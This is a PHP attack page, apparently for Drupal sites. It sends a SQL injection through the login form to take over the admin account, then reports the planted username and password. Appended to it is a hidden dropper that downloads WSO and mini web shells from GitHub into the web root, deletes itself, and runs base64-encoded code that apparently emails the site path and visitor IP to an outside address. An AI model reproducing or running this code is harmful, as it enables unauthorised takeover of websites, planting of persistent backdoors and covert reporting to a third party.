<!Doctype HTML>
<html>
<head>
    <title>Drupal-ADD-User</title>
    <style type="text/css">
    .mymargin{
        margin-top:100px;
        color:white;
        font-family: monospace;
    }
    body{
        background-color:black;
    }
    </style>
</head>
<body>
    <div class="mymargin">
        <center>
    <form method="GET" action="">
        Site : <input type="text" name="url" placeholder="Example: www.site.com">
        <input type="submit" name="submit" value="submit">
    </form>
    <br>
<?php
error_reporting(0);
if(isset($_GET['submit'])){

    $url = $_GET['url'];
    $post_data = "name[0;update users set name %3D 'gassrini' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status
%3D'1' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
    $params = array(
        'http' => array(
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $post_data
        )
    );
    $ctx = stream_context_create($params);
    $data = file_get_contents($url . '/user/login/', null, $ctx);
     echo "<h3>Testing at \"/user/login/</h3>\"";
    if((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data)|| (stristr($data, 'FcUk Crap') && $data)) {
        echo "Success! Log in with username \"gassrini\" and password \"admin\" at {$url}/user/login";
    } else {
        echo "Error! Either the website isn't vulnerable, or your Internet isn't working. ";
    }
}

if(isset($_GET['submit'])){

    $url = "http://".$_GET['url']."/";
    $post_data = "name[0;update users set name %3D 'gassrini' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "',status
%3D'1' where uid %3D '1';#]=test3&name[]=Crap&pass=test&test2=test&form_build_id=&form_id=user_login_block&op=Log+in";
    $params = array(
        'http' => array(
        'method' => 'POST',
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $post_data
        )
    );
    $ctx = stream_context_create($params);
    $data = file_get_contents($url . '?q=node&destination=node', null, $ctx);
     echo "<h3>Testing at \"Index</h3>\"";
    if(stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) {
        echo "Success! Log in with username \"gassrini\" and password \"admin\" at {$url}/user/login";
    } else {
        echo "Error! Either the website isn't vulnerable, or your Internet isn't working. ";
    }
}

?>
    </div>

</body>
</html><?php
function http_get($url){
	$im = curl_init($url);
	curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
	curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($im, CURLOPT_HEADER, 0);
	return curl_exec($im);
	curl_close($im);
}
$check = $_SERVER['DOCUMENT_ROOT'] . "/images/stories/kalix.php" ;
$text = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/wso.php');
$open = fopen($check, 'w');
fwrite($open, $text);
fclose($open);
if(file_exists($check)){
    echo $check."WSO 4.2.5 (Web Shell)";
}else 
  echo "not exits";
echo "WSO 4.2.5 (Web Shell) done .\n " ;
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/xalik.php" ;
$text2 = http_get('https://raw.githubusercontent.com/kalix-Ru/uploads/master/mini.php');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
    echo $check2."Kalix-Xalik Mini5h3LL";
}else 
  echo "not exits";
echo "Kalix-Xalik Mini5h3LL done .\n " ;
@unlink(__FILE__);
eval(base64_decode('JHR1anVhbm1haWwgPSAna2FsaXgweGFsaWtAZ21haWwuY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWRVJfTkFNRSddIC4gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRwZXNhbl9hbGVydCA9ICJmaXggJHhfcGF0aCA6cCAqSVAgQWRkcmVzcyA6IFsgIiAuICRfU0VSVkVSWydSRU1PVEVfQUREUiddIC4gIiBdIjsKbWFpbCgkdHVqdWFubWFpbCwgIkNvbnRhY3QgTWUiLCAkcGVzYW5fYWxlcnQsICJbICIgLiAkX1NFUlZFUlsnUkVNT1RFX0FERFInXSAuICIgXSIpOw=='));?>
